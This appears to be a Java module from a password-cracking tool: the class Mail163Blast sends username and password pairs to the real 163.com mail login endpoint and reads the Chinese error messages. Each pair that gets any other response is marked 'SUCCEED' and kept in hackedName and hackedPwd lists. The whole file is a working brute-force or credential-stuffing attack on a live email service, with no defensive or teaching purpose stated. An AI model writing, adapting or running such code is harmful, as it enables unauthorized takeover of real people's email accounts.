import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;

public class Mail163Blast extends Blast{

	public Mail163Blast(AccackUI a) {
		super(a);
		// TODO Auto-generated constructor stub
	}

	@Override
	public void connect(String name, String pwd) {
		// TODO Auto-generated method stub
		String urlStr = "https://reg.163.com/logins.jsp?username="+
		name+"&password="+pwd+"&url=http://fm163.163.com/coremail/fcg/ntesdoor2";
		try {
			URL url = new URL(urlStr);
			InputStream iStream = url.openStream();
			DataInputStream buf = new DataInputStream(iStream);
			
			StringBuilder str = new StringBuilder();
			byte[] tmp = new byte[1024];
			
			while(buf.read(tmp)!=-1) {
			    str.append(new String(tmp, "UTF-8"));
			    //System.out.println(new String(tmp, "UTF-8"));
			}
			
			if(str.toString().indexOf("密码不正确")!=-1||
					str.toString().indexOf("用户不存在")!=-1) {
				StringBuilder str1 = new StringBuilder(frame.getTextArea());
				str1.append("\n"+name);
				frame.setTextArea(str1.toString());
			} else {
				StringBuilder str1 = new StringBuilder(frame.getTextArea());
				str1.append("\n"+name);
				str1.append("--------------------------------"+"SUCCEED");
				frame.setTextArea(str1.toString());
				total++;
				//list.add(name);
				hackedName.add(name);
				hackedPwd.add(pwd);
			}
			
		} catch (MalformedURLException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

}
